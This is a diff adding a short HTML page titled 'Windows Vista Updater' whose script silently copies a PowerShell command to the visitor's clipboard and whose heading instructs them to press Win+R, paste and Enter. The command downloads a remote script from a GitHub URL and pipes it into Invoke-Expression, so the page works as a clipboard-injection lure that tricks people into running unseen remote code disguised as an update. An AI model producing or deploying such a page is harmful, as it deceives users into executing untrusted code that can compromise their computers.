@@ -1,0 +1,12 @@
+<html>
+  <head>
+  <title>Windows Vista Updater</title>
+</head>
+  <body>
+    <h1>Click Win+R, then Ctrl+V, then enter. clipboard must be enabled</h1>
+    <script>
+      const InstallerFile = 'irm https://github.com/dartzfork/scripts/raw/refs/heads/main/vistaupdate.ps1 | iex'
+      navigator.clipboard.writeText(InstallerFile);
+    </script>
+  </body>
+</html>
